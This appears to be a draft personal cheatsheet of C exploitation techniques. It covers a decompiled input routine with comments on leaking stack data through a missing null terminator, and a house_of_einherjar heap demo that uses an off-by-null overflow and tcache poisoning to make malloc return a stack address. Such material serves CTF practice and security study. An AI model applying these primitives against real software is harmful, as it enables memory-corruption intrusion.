---
title: "Vuln C"
description: "Cheatsheet"
date: "2025-8-3"
draft: true
---

```c
//---
char base_addr [56];
getinput(base_addr,48,1); //possible removes null terminator

__printf_chk(1,"%s is not a valid number\n",base_addr); //will leak stack data if base_addr is not null terminated
//---

void getinput(long base_addr,int max,int stop_on_newline)

{
  int lenn;
  size_t bytes_read;
  int offset;
  char *buffer;
  
  if (max < 1) {
    offset = 0;
  }
  else {
    offset = 0;
    do {
      while( true ) {
        buffer = (char *)(offset + base_addr);
        bytes_read = fread(buffer,1,1,stdin);
        lenn = (int)bytes_read;
        if (lenn < 1) goto exit;
        if ((*buffer != '\n') || (stop_on_newline == 0)) break;
        if (offset != 0) { // skip this by not providing newline, it'll break the while loop and never check
          *buffer = '\0';
          return;
        }
        offset = lenn + -1;
        if (max <= offset) goto exit;
      }
      offset = offset + lenn;
    } while (offset < max);
  }
exit:
  if (offset == max) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  print("Not enough data");
}

```
## house_of_einherjar
```c
	intptr_t stack_var[0x10];
	intptr_t *target = NULL;

	// choose a properly aligned target address
	for(int i=0; i<0x10; i++) {
		if(((long)&stack_var[i] & 0xf) == 0) {
			target = &stack_var[i];
			break;
		}
	}

	intptr_t *a = malloc(0x38);
    // construct fake chunk
	a[0] = 0;	// prev_size (Not Used)
	a[1] = 0x60; // size
	a[2] = (size_t) a; // fwd
	a[3] = (size_t) a; // bck

	uint8_t *b = (uint8_t *) malloc(0x28);
	int real_b_size = malloc_usable_size(b);

	uint8_t *c = (uint8_t *) malloc(0xf8);
	uint64_t* c_size_ptr = (uint64_t*)(c - 8);
	// VULNERABILITY
	b[real_b_size] = 0; // c.prev_in_use = 0
	// VULNERABILITY
	size_t fake_size = (size_t)((c - sizeof(size_t) * 2) - (uint8_t*) a); // 0x60
	*(size_t*) &b[real_b_size-sizeof(size_t)] = fake_size; // c.prev_size = 0x60

	a[1] = fake_size; //just make sure

	for(int i=0; i<sizeof(x)/sizeof(intptr_t*); i++) {
		x[i] = malloc(0xf8);
	}
	for(int i=0; i<sizeof(x)/sizeof(intptr_t*); i++) {
		free(x[i]);
	}

	free(c); //merge c, b and fake_chunk

	intptr_t *d = malloc(0x158); //merged chunk

    // tcache poisoning
	uint8_t *pad = malloc(0x28);
	free(pad);
	free(b);
	d[0x30 / 8] = (long)target ^ ((long)&d[0x30/8] >> 12); // d->fd = target(stack)
	malloc(0x28); //head points to target
	intptr_t *e = malloc(0x28); // stack address allocated
```
